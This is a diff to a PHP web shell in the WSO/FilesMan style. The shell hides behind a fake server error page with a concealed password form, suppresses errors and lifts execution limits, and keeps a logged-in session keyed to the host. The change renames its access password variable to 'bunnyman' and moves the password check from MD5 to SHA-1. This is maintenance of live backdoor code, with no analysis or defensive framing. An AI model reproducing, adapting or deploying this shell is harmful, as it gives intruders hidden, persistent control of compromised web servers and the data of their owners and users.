@@ -8,7 +8,7 @@ set_time_limit(0);
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-$d7netp = '4a21666151e05e86d307b9ffb5423fe7'; // kepongentod
+$bunnyman = 'dc7474051d103638bea737952a13f8bd59c41085'; // kepongentod
 $color = '#00ff00';
 $default_action = 'FilesMan';
 $default_use_ajax = true;
@@ -33,16 +33,16 @@ error was encountered while trying to use an ErrorDocument to handle the request
 		</style><center><br><br><br><br><br><br><br><br><br>
 		<form method="post">
 			<center>
-				<input type="password" name="d7netp" autocomplete="off">
+				<input type="password" name="bunnyman" autocomplete="off">
 		</form>
 </body></html>
 		</center>
 	<?php
 exit;
 }
-if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
-    if (empty($d7netp) || (isset($_POST['d7netp']) && (md5($_POST['d7netp']) == $d7netp))) {
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+if (!isset($_SESSION[sha1($_SERVER['HTTP_HOST'])])) {
+    if (empty($bunnyman) || (isset($_POST['bunnyman']) && (sha1($_POST['bunnyman']) == $bunnyman))) {
+        $_SESSION[sha1($_SERVER['HTTP_HOST'])] = true;
     } else {
         login_shell();
     }
